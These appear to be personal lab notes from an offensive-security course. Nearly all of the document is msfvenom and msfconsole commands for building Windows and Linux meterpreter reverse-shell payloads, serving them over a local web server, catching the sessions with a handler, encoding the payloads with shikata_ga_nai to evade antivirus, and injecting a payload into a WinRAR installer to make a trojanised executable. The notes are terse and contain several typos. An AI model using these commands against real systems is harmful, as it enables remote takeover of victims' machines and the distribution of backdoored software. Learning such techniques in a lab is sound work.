### Lab Payloads
	msfvenom --list payloads
	(windows) msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHSOST=ip LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe
	(windows) msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe
	msfvenom --list formats
	cd ..
	mkdir
	(linux) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=1234 -f elf > ~/Desktop/Linux_Payloads/payloadx86.exe
	ls
	sudo python3 -m http.server
	in another window
	msfconsole 
	use mutli/handler
	set payload windows/meterpreter/reverse_tcp
	show options
	set LHOST ip
	set LPORT 1234
	exploit
	sysinfo
	cd /Desktop/Linux_Payloads
	./payloadx86.exe
	use multi/handler
	set payload linux/x86/meterpreter/reverse_tcp
	exploit
	it will run a meterpreter u can access linux machine
	ls -la 

## Encoding Payloads with Msfvenom
	(windows) msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=1234 -e x86 /shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
	rm encodedx86.exe
	(windows) msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
	ls
	cd ..
	(linux) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/Linux_Payloads/encodedx86.exe
	cd Windows_Payloads
	sudo python -m http.server
	msfvenom
	set payload windows/meterpreter/reverse_tcp
	set LHOST ip
	set LPORT 1234
	show options
	exploit
	set payload linux/x86/meterpreter/reverse_tcp
	set LHOST ip
	set LPORT 1234
	exploit


### injecting payloads into windows portable executable
	msfvenom
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe

